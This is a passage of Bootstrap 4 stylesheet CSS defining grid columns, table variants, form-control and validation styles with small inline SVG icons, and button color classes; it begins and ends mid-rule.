16.666667%;    flex: 0 0 16.666667%;    max-width: 16.666667%;  }  .col-xl-3 {    -ms-flex: 0 0 25%;    flex: 0 0 25%;    max-width: 25%;  }  .col-xl-4 {    -ms-flex: 0 0 33.333333%;    flex: 0 0 33.333333%;    max-width: 33.333333%;  }  .col-xl-5 {    -ms-flex: 0 0 41.666667%;    flex: 0 0 41.666667%;    max-width: 41.666667%;  }  .col-xl-6 {    -ms-flex: 0 0 50%;    flex: 0 0 50%;    max-width: 50%;  }  .col-xl-7 {    -ms-flex: 0 0 58.333333%;    flex: 0 0 58.333333%;    max-width: 58.333333%;  }  .col-xl-8 {    -ms-flex: 0 0 66.666667%;    flex: 0 0 66.666667%;    max-width: 66.666667%;  }  .col-xl-9 {    -ms-flex: 0 0 75%;    flex: 0 0 75%;    max-width: 75%;  }  .col-xl-10 {    -ms-flex: 0 0 83.333333%;    flex: 0 0 83.333333%;    max-width: 83.333333%;  }  .col-xl-11 {    -ms-flex: 0 0 91.666667%;    flex: 0 0 91.666667%;    max-width: 91.666667%;  }  .col-xl-12 {    -ms-flex: 0 0 100%;    flex: 0 0 100%;    max-width: 100%;  }  .order-xl-first {    -ms-flex-order: -1;    order: -1;  }  .order-xl-last {    -ms-flex-order: 13;    order: 13;  }  .order-xl-0 {    -ms-flex-order: 0;    order: 0;  }  .order-xl-1 {    -ms-flex-order: 1;    order: 1;  }  .order-xl-2 {    -ms-flex-order: 2;    order: 2;  }  .order-xl-3 {    -ms-flex-order: 3;    order: 3;  }  .order-xl-4 {    -ms-flex-order: 4;    order: 4;  }  .order-xl-5 {    -ms-flex-order: 5;    order: 5;  }  .order-xl-6 {    -ms-flex-order: 6;    order: 6;  }  .order-xl-7 {    -ms-flex-order: 7;    order: 7;  }  .order-xl-8 {    -ms-flex-order: 8;    order: 8;  }  .order-xl-9 {    -ms-flex-order: 9;    order: 9;  }  .order-xl-10 {    -ms-flex-order: 10;    order: 10;  }  .order-xl-11 {    -ms-flex-order: 11;    order: 11;  }  .order-xl-12 {    -ms-flex-order: 12;    order: 12;  }  .offset-xl-0 {    margin-left: 0;  }  .offset-xl-1 {    margin-left: 8.333333%;  }  .offset-xl-2 {    margin-left: 16.666667%;  }  .offset-xl-3 {    margin-left: 25%;  }  .offset-xl-4 {    margin-left: 33.333333%;  }  .offset-xl-5 {    margin-left: 41.666667%;  }  .offset-xl-6 {    margin-left: 50%;  }  .offset-xl-7 {    margin-left: 58.333333%;  }  .offset-xl-8 {    margin-left: 66.666667%;  }  .offset-xl-9 {    margin-left: 75%;  }  .offset-xl-10 {    margin-left: 83.333333%;  }  .offset-xl-11 {    margin-left: 91.666667%;  }}.table {  width: 100%;  margin-bottom: 1rem;  color: #212529;}.table th,.table td {  padding: 0.75rem;  vertical-align: top;  border-top: 1px solid #dee2e6;}.table thead th {  vertical-align: bottom;  border-bottom: 2px solid #dee2e6;}.table tbody + tbody {  border-top: 2px solid #dee2e6;}.table-sm th,.table-sm td {  padding: 0.3rem;}.table-bordered {  border: 1px solid #dee2e6;}.table-bordered th,.table-bordered td {  border: 1px solid #dee2e6;}.table-bordered thead th,.table-bordered thead td {  border-bottom-width: 2px;}.table-borderless th,.table-borderless td,.table-borderless thead th,.table-borderless tbody + tbody {  border: 0;}.table-striped tbody tr:nth-of-type(odd) {  background-color: rgba(0, 0, 0, 0.05);}.table-hover tbody tr:hover {  color: #212529;  background-color: rgba(0, 0, 0, 0.075);}.table-primary,.table-primary > th,.table-primary > td {  background-color: #b8daff;}.table-primary th,.table-primary td,.table-primary thead th,.table-primary tbody + tbody {  border-color: #7abaff;}.table-hover .table-primary:hover {  background-color: #9fcdff;}.table-hover .table-primary:hover > td,.table-hover .table-primary:hover > th {  background-color: #9fcdff;}.table-secondary,.table-secondary > th,.table-secondary > td {  background-color: #d6d8db;}.table-secondary th,.table-secondary td,.table-secondary thead th,.table-secondary tbody + tbody {  border-color: #b3b7bb;}.table-hover .table-secondary:hover {  background-color: #c8cbcf;}.table-hover .table-secondary:hover > td,.table-hover .table-secondary:hover > th {  background-color: #c8cbcf;}.table-success,.table-success > th,.table-success > td {  background-color: #c3e6cb;}.table-success th,.table-success td,.table-success thead th,.table-success tbody + tbody {  border-color: #8fd19e;}.table-hover .table-success:hover {  background-color: #b1dfbb;}.table-hover .table-success:hover > td,.table-hover .table-success:hover > th {  background-color: #b1dfbb;}.table-info,.table-info > th,.table-info > td {  background-color: #bee5eb;}.table-info th,.table-info td,.table-info thead th,.table-info tbody + tbody {  border-color: #86cfda;}.table-hover .table-info:hover {  background-color: #abdde5;}.table-hover .table-info:hover > td,.table-hover .table-info:hover > th {  background-color: #abdde5;}.table-warning,.table-warning > th,.table-warning > td {  background-color: #ffeeba;}.table-warning th,.table-warning td,.table-warning thead th,.table-warning tbody + tbody {  border-color: #ffdf7e;}.table-hover .table-warning:hover {  background-color: #ffe8a1;}.table-hover .table-warning:hover > td,.table-hover .table-warning:hover > th {  background-color: #ffe8a1;}.table-danger,.table-danger > th,.table-danger > td {  background-color: #f5c6cb;}.table-danger th,.table-danger td,.table-danger thead th,.table-danger tbody + tbody {  border-color: #ed969e;}.table-hover .table-danger:hover {  background-color: #f1b0b7;}.table-hover .table-danger:hover > td,.table-hover .table-danger:hover > th {  background-color: #f1b0b7;}.table-light,.table-light > th,.table-light > td {  background-color: #fdfdfe;}.table-light th,.table-light td,.table-light thead th,.table-light tbody + tbody {  border-color: #fbfcfc;}.table-hover .table-light:hover {  background-color: #ececf6;}.table-hover .table-light:hover > td,.table-hover .table-light:hover > th {  background-color: #ececf6;}.table-dark,.table-dark > th,.table-dark > td {  background-color: #c6c8ca;}.table-dark th,.table-dark td,.table-dark thead th,.table-dark tbody + tbody {  border-color: #95999c;}.table-hover .table-dark:hover {  background-color: #b9bbbe;}.table-hover .table-dark:hover > td,.table-hover .table-dark:hover > th {  background-color: #b9bbbe;}.table-active,.table-active > th,.table-active > td {  background-color: rgba(0, 0, 0, 0.075);}.table-hover .table-active:hover {  background-color: rgba(0, 0, 0, 0.075);}.table-hover .table-active:hover > td,.table-hover .table-active:hover > th {  background-color: rgba(0, 0, 0, 0.075);}.table .thead-dark th {  color: #fff;  background-color: #343a40;  border-color: #454d55;}.table .thead-light th {  color: #495057;  background-color: #e9ecef;  border-color: #dee2e6;}.table-dark {  color: #fff;  background-color: #343a40;}.table-dark th,.table-dark td,.table-dark thead th {  border-color: #454d55;}.table-dark.table-bordered {  border: 0;}.table-dark.table-striped tbody tr:nth-of-type(odd) {  background-color: rgba(255, 255, 255, 0.05);}.table-dark.table-hover tbody tr:hover {  color: #fff;  background-color: rgba(255, 255, 255, 0.075);}@media (max-width: 575.98px) {  .table-responsive-sm {    display: block;    width: 100%;    overflow-x: auto;    -webkit-overflow-scrolling: touch;  }  .table-responsive-sm > .table-bordered {    border: 0;  }}@media (max-width: 767.98px) {  .table-responsive-md {    display: block;    width: 100%;    overflow-x: auto;    -webkit-overflow-scrolling: touch;  }  .table-responsive-md > .table-bordered {    border: 0;  }}@media (max-width: 991.98px) {  .table-responsive-lg {    display: block;    width: 100%;    overflow-x: auto;    -webkit-overflow-scrolling: touch;  }  .table-responsive-lg > .table-bordered {    border: 0;  }}@media (max-width: 1199.98px) {  .table-responsive-xl {    display: block;    width: 100%;    overflow-x: auto;    -webkit-overflow-scrolling: touch;  }  .table-responsive-xl > .table-bordered {    border: 0;  }}.table-responsive {  display: block;  width: 100%;  overflow-x: auto;  -webkit-overflow-scrolling: touch;}.table-responsive > .table-bordered {  border: 0;}.form-control {  display: block;  width: 100%;  height: calc(1.5em + 0.75rem + 2px);  padding: 0.375rem 0.75rem;  font-size: 1rem;  font-weight: 400;  line-height: 1.5;  color: #495057;  background-color: #fff;  background-clip: padding-box;  border: 1px solid #ced4da;  border-radius: 0.25rem;  transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .form-control {    transition: none;  }}.form-control::-ms-expand {  background-color: transparent;  border: 0;}.form-control:focus {  color: #495057;  background-color: #fff;  border-color: #80bdff;  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.form-control::-webkit-input-placeholder {  color: #6c757d;  opacity: 1;}.form-control::-moz-placeholder {  color: #6c757d;  opacity: 1;}.form-control:-ms-input-placeholder {  color: #6c757d;  opacity: 1;}.form-control::-ms-input-placeholder {  color: #6c757d;  opacity: 1;}.form-control::placeholder {  color: #6c757d;  opacity: 1;}.form-control:disabled, .form-control[readonly] {  background-color: #e9ecef;  opacity: 1;}select.form-control:focus::-ms-value {  color: #495057;  background-color: #fff;}.form-control-file,.form-control-range {  display: block;  width: 100%;}.col-form-label {  padding-top: calc(0.375rem + 1px);  padding-bottom: calc(0.375rem + 1px);  margin-bottom: 0;  font-size: inherit;  line-height: 1.5;}.col-form-label-lg {  padding-top: calc(0.5rem + 1px);  padding-bottom: calc(0.5rem + 1px);  font-size: 1.25rem;  line-height: 1.5;}.col-form-label-sm {  padding-top: calc(0.25rem + 1px);  padding-bottom: calc(0.25rem + 1px);  font-size: 0.875rem;  line-height: 1.5;}.form-control-plaintext {  display: block;  width: 100%;  padding-top: 0.375rem;  padding-bottom: 0.375rem;  margin-bottom: 0;  line-height: 1.5;  color: #212529;  background-color: transparent;  border: solid transparent;  border-width: 1px 0;}.form-control-plaintext.form-control-sm, .form-control-plaintext.form-control-lg {  padding-right: 0;  padding-left: 0;}.form-control-sm {  height: calc(1.5em + 0.5rem + 2px);  padding: 0.25rem 0.5rem;  font-size: 0.875rem;  line-height: 1.5;  border-radius: 0.2rem;}.form-control-lg {  height: calc(1.5em + 1rem + 2px);  padding: 0.5rem 1rem;  font-size: 1.25rem;  line-height: 1.5;  border-radius: 0.3rem;}select.form-control[size], select.form-control[multiple] {  height: auto;}textarea.form-control {  height: auto;}.form-group {  margin-bottom: 1rem;}.form-text {  display: block;  margin-top: 0.25rem;}.form-row {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  margin-right: -5px;  margin-left: -5px;}.form-row > .col,.form-row > [class*="col-"] {  padding-right: 5px;  padding-left: 5px;}.form-check {  position: relative;  display: block;  padding-left: 1.25rem;}.form-check-input {  position: absolute;  margin-top: 0.3rem;  margin-left: -1.25rem;}.form-check-input:disabled ~ .form-check-label {  color: #6c757d;}.form-check-label {  margin-bottom: 0;}.form-check-inline {  display: -ms-inline-flexbox;  display: inline-flex;  -ms-flex-align: center;  align-items: center;  padding-left: 0;  margin-right: 0.75rem;}.form-check-inline .form-check-input {  position: static;  margin-top: 0;  margin-right: 0.3125rem;  margin-left: 0;}.valid-feedback {  display: none;  width: 100%;  margin-top: 0.25rem;  font-size: 80%;  color: #28a745;}.valid-tooltip {  position: absolute;  top: 100%;  z-index: 5;  display: none;  max-width: 100%;  padding: 0.25rem 0.5rem;  margin-top: .1rem;  font-size: 0.875rem;  line-height: 1.5;  color: #fff;  background-color: rgba(40, 167, 69, 0.9);  border-radius: 0.25rem;}.was-validated .form-control:valid, .form-control.is-valid {  border-color: #28a745;  padding-right: calc(1.5em + 0.75rem);  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%2328a745' d='M2.3 6.73L.6 4.53c-.4-1.04.46-1.4 1.1-.8l1.1 1.4 3.4-3.8c.6-.63 1.6-.27 1.2.7l-4 4.6c-.43.5-.8.4-1.1.1z'/%3e%3c/svg%3e");  background-repeat: no-repeat;  background-position: center right calc(0.375em + 0.1875rem);  background-size: calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);}.was-validated .form-control:valid:focus, .form-control.is-valid:focus {  border-color: #28a745;  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.25);}.was-validated .form-control:valid ~ .valid-feedback,.was-validated .form-control:valid ~ .valid-tooltip, .form-control.is-valid ~ .valid-feedback,.form-control.is-valid ~ .valid-tooltip {  display: block;}.was-validated textarea.form-control:valid, textarea.form-control.is-valid {  padding-right: calc(1.5em + 0.75rem);  background-position: top calc(0.375em + 0.1875rem) right calc(0.375em + 0.1875rem);}.was-validated .custom-select:valid, .custom-select.is-valid {  border-color: #28a745;  padding-right: calc((1em + 0.75rem) * 3 / 4 + 1.75rem);  background: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%2328a745' d='M2.3 6.73L.6 4.53c-.4-1.04.46-1.4 1.1-.8l1.1 1.4 3.4-3.8c.6-.63 1.6-.27 1.2.7l-4 4.6c-.43.5-.8.4-1.1.1z'/%3e%3c/svg%3e") #fff no-repeat center right 1.75rem/calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);}.was-validated .custom-select:valid:focus, .custom-select.is-valid:focus {  border-color: #28a745;  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.25);}.was-validated .custom-select:valid ~ .valid-feedback,.was-validated .custom-select:valid ~ .valid-tooltip, .custom-select.is-valid ~ .valid-feedback,.custom-select.is-valid ~ .valid-tooltip {  display: block;}.was-validated .form-control-file:valid ~ .valid-feedback,.was-validated .form-control-file:valid ~ .valid-tooltip, .form-control-file.is-valid ~ .valid-feedback,.form-control-file.is-valid ~ .valid-tooltip {  display: block;}.was-validated .form-check-input:valid ~ .form-check-label, .form-check-input.is-valid ~ .form-check-label {  color: #28a745;}.was-validated .form-check-input:valid ~ .valid-feedback,.was-validated .form-check-input:valid ~ .valid-tooltip, .form-check-input.is-valid ~ .valid-feedback,.form-check-input.is-valid ~ .valid-tooltip {  display: block;}.was-validated .custom-control-input:valid ~ .custom-control-label, .custom-control-input.is-valid ~ .custom-control-label {  color: #28a745;}.was-validated .custom-control-input:valid ~ .custom-control-label::before, .custom-control-input.is-valid ~ .custom-control-label::before {  border-color: #28a745;}.was-validated .custom-control-input:valid ~ .valid-feedback,.was-validated .custom-control-input:valid ~ .valid-tooltip, .custom-control-input.is-valid ~ .valid-feedback,.custom-control-input.is-valid ~ .valid-tooltip {  display: block;}.was-validated .custom-control-input:valid:checked ~ .custom-control-label::before, .custom-control-input.is-valid:checked ~ .custom-control-label::before {  border-color: #34ce57;  background-color: #34ce57;}.was-validated .custom-control-input:valid:focus ~ .custom-control-label::before, .custom-control-input.is-valid:focus ~ .custom-control-label::before {  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.25);}.was-validated .custom-control-input:valid:focus:not(:checked) ~ .custom-control-label::before, .custom-control-input.is-valid:focus:not(:checked) ~ .custom-control-label::before {  border-color: #28a745;}.was-validated .custom-file-input:valid ~ .custom-file-label, .custom-file-input.is-valid ~ .custom-file-label {  border-color: #28a745;}.was-validated .custom-file-input:valid ~ .valid-feedback,.was-validated .custom-file-input:valid ~ .valid-tooltip, .custom-file-input.is-valid ~ .valid-feedback,.custom-file-input.is-valid ~ .valid-tooltip {  display: block;}.was-validated .custom-file-input:valid:focus ~ .custom-file-label, .custom-file-input.is-valid:focus ~ .custom-file-label {  border-color: #28a745;  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.25);}.invalid-feedback {  display: none;  width: 100%;  margin-top: 0.25rem;  font-size: 80%;  color: #dc3545;}.invalid-tooltip {  position: absolute;  top: 100%;  z-index: 5;  display: none;  max-width: 100%;  padding: 0.25rem 0.5rem;  margin-top: .1rem;  font-size: 0.875rem;  line-height: 1.5;  color: #fff;  background-color: rgba(220, 53, 69, 0.9);  border-radius: 0.25rem;}.was-validated .form-control:invalid, .form-control.is-invalid {  border-color: #dc3545;  padding-right: calc(1.5em + 0.75rem);  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23dc3545' viewBox='-2 -2 7 7'%3e%3cpath stroke='%23dc3545' d='M0 0l3 3m0-3L0 3'/%3e%3ccircle r='.5'/%3e%3ccircle cx='3' r='.5'/%3e%3ccircle cy='3' r='.5'/%3e%3ccircle cx='3' cy='3' r='.5'/%3e%3c/svg%3E");  background-repeat: no-repeat;  background-position: center right calc(0.375em + 0.1875rem);  background-size: calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);}.was-validated .form-control:invalid:focus, .form-control.is-invalid:focus {  border-color: #dc3545;  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25);}.was-validated .form-control:invalid ~ .invalid-feedback,.was-validated .form-control:invalid ~ .invalid-tooltip, .form-control.is-invalid ~ .invalid-feedback,.form-control.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated textarea.form-control:invalid, textarea.form-control.is-invalid {  padding-right: calc(1.5em + 0.75rem);  background-position: top calc(0.375em + 0.1875rem) right calc(0.375em + 0.1875rem);}.was-validated .custom-select:invalid, .custom-select.is-invalid {  border-color: #dc3545;  padding-right: calc((1em + 0.75rem) * 3 / 4 + 1.75rem);  background: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23dc3545' viewBox='-2 -2 7 7'%3e%3cpath stroke='%23dc3545' d='M0 0l3 3m0-3L0 3'/%3e%3ccircle r='.5'/%3e%3ccircle cx='3' r='.5'/%3e%3ccircle cy='3' r='.5'/%3e%3ccircle cx='3' cy='3' r='.5'/%3e%3c/svg%3E") #fff no-repeat center right 1.75rem/calc(0.75em + 0.375rem) calc(0.75em + 0.375rem);}.was-validated .custom-select:invalid:focus, .custom-select.is-invalid:focus {  border-color: #dc3545;  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25);}.was-validated .custom-select:invalid ~ .invalid-feedback,.was-validated .custom-select:invalid ~ .invalid-tooltip, .custom-select.is-invalid ~ .invalid-feedback,.custom-select.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated .form-control-file:invalid ~ .invalid-feedback,.was-validated .form-control-file:invalid ~ .invalid-tooltip, .form-control-file.is-invalid ~ .invalid-feedback,.form-control-file.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated .form-check-input:invalid ~ .form-check-label, .form-check-input.is-invalid ~ .form-check-label {  color: #dc3545;}.was-validated .form-check-input:invalid ~ .invalid-feedback,.was-validated .form-check-input:invalid ~ .invalid-tooltip, .form-check-input.is-invalid ~ .invalid-feedback,.form-check-input.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated .custom-control-input:invalid ~ .custom-control-label, .custom-control-input.is-invalid ~ .custom-control-label {  color: #dc3545;}.was-validated .custom-control-input:invalid ~ .custom-control-label::before, .custom-control-input.is-invalid ~ .custom-control-label::before {  border-color: #dc3545;}.was-validated .custom-control-input:invalid ~ .invalid-feedback,.was-validated .custom-control-input:invalid ~ .invalid-tooltip, .custom-control-input.is-invalid ~ .invalid-feedback,.custom-control-input.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated .custom-control-input:invalid:checked ~ .custom-control-label::before, .custom-control-input.is-invalid:checked ~ .custom-control-label::before {  border-color: #e4606d;  background-color: #e4606d;}.was-validated .custom-control-input:invalid:focus ~ .custom-control-label::before, .custom-control-input.is-invalid:focus ~ .custom-control-label::before {  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25);}.was-validated .custom-control-input:invalid:focus:not(:checked) ~ .custom-control-label::before, .custom-control-input.is-invalid:focus:not(:checked) ~ .custom-control-label::before {  border-color: #dc3545;}.was-validated .custom-file-input:invalid ~ .custom-file-label, .custom-file-input.is-invalid ~ .custom-file-label {  border-color: #dc3545;}.was-validated .custom-file-input:invalid ~ .invalid-feedback,.was-validated .custom-file-input:invalid ~ .invalid-tooltip, .custom-file-input.is-invalid ~ .invalid-feedback,.custom-file-input.is-invalid ~ .invalid-tooltip {  display: block;}.was-validated .custom-file-input:invalid:focus ~ .custom-file-label, .custom-file-input.is-invalid:focus ~ .custom-file-label {  border-color: #dc3545;  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25);}.form-inline {  display: -ms-flexbox;  display: flex;  -ms-flex-flow: row wrap;  flex-flow: row wrap;  -ms-flex-align: center;  align-items: center;}.form-inline .form-check {  width: 100%;}@media (min-width: 576px) {  .form-inline label {    display: -ms-flexbox;    display: flex;    -ms-flex-align: center;    align-items: center;    -ms-flex-pack: center;    justify-content: center;    margin-bottom: 0;  }  .form-inline .form-group {    display: -ms-flexbox;    display: flex;    -ms-flex: 0 0 auto;    flex: 0 0 auto;    -ms-flex-flow: row wrap;    flex-flow: row wrap;    -ms-flex-align: center;    align-items: center;    margin-bottom: 0;  }  .form-inline .form-control {    display: inline-block;    width: auto;    vertical-align: middle;  }  .form-inline .form-control-plaintext {    display: inline-block;  }  .form-inline .input-group,  .form-inline .custom-select {    width: auto;  }  .form-inline .form-check {    display: -ms-flexbox;    display: flex;    -ms-flex-align: center;    align-items: center;    -ms-flex-pack: center;    justify-content: center;    width: auto;    padding-left: 0;  }  .form-inline .form-check-input {    position: relative;    -ms-flex-negative: 0;    flex-shrink: 0;    margin-top: 0;    margin-right: 0.25rem;    margin-left: 0;  }  .form-inline .custom-control {    -ms-flex-align: center;    align-items: center;    -ms-flex-pack: center;    justify-content: center;  }  .form-inline .custom-control-label {    margin-bottom: 0;  }}.btn {  display: inline-block;  font-weight: 400;  color: #212529;  text-align: center;  vertical-align: middle;  -webkit-user-select: none;  -moz-user-select: none;  -ms-user-select: none;  user-select: none;  background-color: transparent;  border: 1px solid transparent;  padding: 0.375rem 0.75rem;  font-size: 1rem;  line-height: 1.5;  border-radius: 0.25rem;  transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .btn {    transition: none;  }}.btn:hover {  color: #212529;  text-decoration: none;}.btn:focus, .btn.focus {  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.btn.disabled, .btn:disabled {  opacity: 0.65;}a.btn.disabled,fieldset:disabled a.btn {  pointer-events: none;}.btn-primary {  color: #fff;  background-color: #007bff;  border-color: #007bff;}.btn-primary:hover {  color: #fff;  background-color: #0069d9;  border-color: #0062cc;}.btn-primary:focus, .btn-primary.focus {  box-shadow: 0 0 0 0.2rem rgba(38, 143, 255, 0.5);}.btn-primary.disabled, .btn-primary:disabled {  color: #fff;  background-color: #007bff;  border-color: #007bff;}.btn-primary:not(:disabled):not(.disabled):active, .btn-primary:not(:disabled):not(.disabled).active,.show > .btn-primary.dropdown-toggle {  color: #fff;  background-color: #0062cc;  border-color: #005cbf;}.btn-primary:not(:disabled):not(.disabled):active:focus, .btn-primary:not(:disabled):not(.disabled).active:focus,.show > .btn-primary.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(38, 143, 255, 0.5);}.btn-secondary {  color: #fff;  background-color: #6c757d;  border-color: #6c757d;}.btn-secondary:hover {  color: #fff;  background-color: #5a6268;  border-color: #545b62;}.btn-secondary:focus, .btn-secondary.focus {  box-shadow: 0 0 0 0.2rem rgba(130, 138, 145, 0.5);}.btn-secondary.disabled, .btn-secondary:disabled {  color: #fff;  background-color: #6c757d;  border-color: #6c757d;}.btn-secondary:not(:disabled):not(.disabled):active, .btn-secondary:not(:disabled):not(.disabled).active,.show > .btn-secondary.dropdown-toggle {  color: #fff;  background-color: #545b62;  border-color: #4e555b;}.btn-secondary:not(:disabled):not(.disabled):active:focus, .btn-secondary:not(:disabled):not(.disabled).active:focus,.show > .btn-secondary.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(130, 138, 145, 0.5);}.btn-success {  color: #fff;  background-color: #28a745;  border-color: #28a745;}.btn-success:hover {  color: #fff;  background-color: #218838;  border-color: #1e7e34;}.btn-success:focus, .btn-success.focus {  box-shadow: 0 0 0 0.2rem rgba(72, 180, 97, 0.5);}.btn-success.disabled, .btn-success:disabled {  color: #fff;  background-color: #28a745;  border-color: #28a745;}.btn-success:not(:disabled):not(.disabled):active, .btn-success:not(:disabled):not(.disabled).active,.show > .btn-success.dropdown-toggle {  color: #fff;  background-color: #1e7e34;  border-color: #1c7430;}.btn-success:not(:disabled):not(.disabled):active:focus, .btn-success:not(:disabled):not(.disabled).active:focus,.show > .btn-success.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(72, 180, 97, 0.5);}.btn-info {  color: #fff;  background-color: #17a2b8;  border-color: #17a2b8;}.btn-info:hover {  color: #fff;  background-color: #138496;  border-color: #117a8b;}.btn-info:focus, .btn-info.focus {  box-shadow: 0 0 0 0.2rem rgba(58, 176, 195, 0.5);}.btn-info.disabled, .btn-info:disabled {  color: #fff;  background-color: #17a2b8;  border-color: #17a2b8;}.btn-info:not(:disabled):not(.disabled):active, .btn-info:not(:disabled):not(.disabled).active,.show > .btn-info.dropdown-toggle {  color: #fff;  background-color: #117a8b;  border-color: #10707f;}.btn-info:not(:disabled):not(.disabled):active:focus, .btn-info:not(:disabled):not(.disabled).active:focus,.show > .btn-info.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(58, 176, 195, 0.5);}.btn-warning {  color: #212529;  background-color: #ffc107;  border-color: #ffc107;}.btn-warning:hover {  color: #212529;  background-color: #e0a800;  border-color: #d39e00;}.btn-warning:focus, .btn-warning.focus {  box-shadow: 0 0 0 0.2rem rgba(222, 170, 12, 0.5);}.btn-warning.disabled, .btn-warning:disabled {  color: #212529;  background-color: #ffc107;  border-color: #ffc107;}.btn-warning:not(:disabled):not(.disabled):active, .btn-warning:not(:disabled):not(.disabled).active,.show > .btn-warning.dropdown-toggle {  color: #212529;  background-color: #d39e00;  border-color: #c69500;}.btn-warning:not(:disabled):not(.disabled):active:focus, .btn-warning:not(:disabled):not(.disabled).active:focus,.show > .btn-warning.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(222, 170, 12, 0.5);}.btn-danger {  color: #fff;  background-color: #dc3545;  border-color: #dc3545;}.btn-danger:hover {  color: #fff;  background-color: #c82333;  border-color: #bd2130;}.btn-danger:focus, .btn-danger.focus {  box-shadow: 0 0 0 0.2rem rgba(225, 83, 97, 0.5);}.btn-danger.disabled, .btn-danger:disabled {  color: #fff;  background-color: #dc3545;  border-color: #dc3545;}.btn-danger:not(:disabled):not(.disabled):active, .btn-danger:not(:disabled):not(.disabled).active,.show > .btn-danger.dropdown-toggle {  color: #fff;  background-color: #bd2130;  border-color: #b21f2d;}.btn-danger:not(:disabled):not(.disabled):active:focus, .btn-danger:not(:disabled):not(.disabled).active:focus,.show > .btn-danger.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(225, 83, 97, 0.5);}.btn-light {  color: #212529;  background-color: #f8f9fa;  border-color: #f8f9fa;}.btn-light:hover {  color: #212529;  background-color: #e2e6ea;  border-color: #dae0e5;}.btn-light:focus, .btn-light.focus {  box-shadow: 0 0 0 0.2rem rgba(216, 217, 219, 0.5);}.btn-light.disabled, .btn-light:disabled {  color: #212529;  background-color: #f8f9fa;  border-color: #f8f9fa;}.btn-light:not(:disabled):not(.disabled):active, .btn-light:not(:disabled):not(.disabled).active,.show > .btn-light.dropdown-toggle {  color: #212529;  background-color: #dae0e5;  border-color: #d3d9df;}.btn-light:not(:disabled):not(.disabled):active:focus, .btn-light:not(:disabled):not(.disabled).active:focus,.show > .btn-light.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(216, 217, 219, 0.5);}.btn-dark {  color: #fff;  background-color: #343a40;  border-color: #343a40;}.btn-dark:hover {  color: #fff;  background-color: #23272b;  border-color: #1d2124;}.btn-dark:focus, .btn-dark.focus {  box-shadow: 0 0 0 0.2rem rgba(82, 88, 93, 0.5);}.btn-dark.disabled, .btn-dark:disabled {  color: #fff;  background-color: #343a40;  border-color: #343a40;}.btn-dark:not(:disabled):not(.disabled):active, .btn-dark:not(:disabled):not(.disabled).active,.show > .btn-dark.dropdown-toggle {  color: #fff;  background-color: #1d2124;  border-color: #171a1d;}.btn-dark:not(:disabled):not(.disabled):active:focus, .btn-dark:not(:disabled):not(.disabled).active:focus,.show > .btn-dark.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(82, 88, 93, 0.5);}.btn-outline-primary {  color: #007bff;  border-color: #007bff;}.btn-outline-primary:hover {  color: #fff;  background-color: #007bff;  border-color: #007bff;}.btn-outline-primary:focus, .btn-outline-primary.focus {  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.5);}.btn-outline-primary.disabled, .btn-outline-primary:disabled {  color: #007bff;  background-color: transparent;}.btn-outline-primary:not(:disabled):not(.disabled):active, .btn-outline-primary:not(:disabled):not(.disabled).active,.show > .btn-outline-primary.dropdown-toggle {  color: #fff;  background-color: #007bff;  border-color: #007bff;}.btn-outline-primary:not(:disabled):not(.disabled):active:focus, .btn-outline-primary:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-primary.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.5);}.btn-outline-secondary {  color: #6c757d;  border-color: #6c757d;}.btn-outline-secondary:hover {  color: #fff;  background-color: #6c757d;  border-color: #6c757d;}.btn-outline-secondary:focus, .btn-outline-secondary.focus {  box-shadow: 0 0 0 0.2rem rgba(108, 117, 125, 0.5);}.btn-outline-secondary.disabled, .btn-outline-secondary:disabled {  color: #6c757d;  background-color: 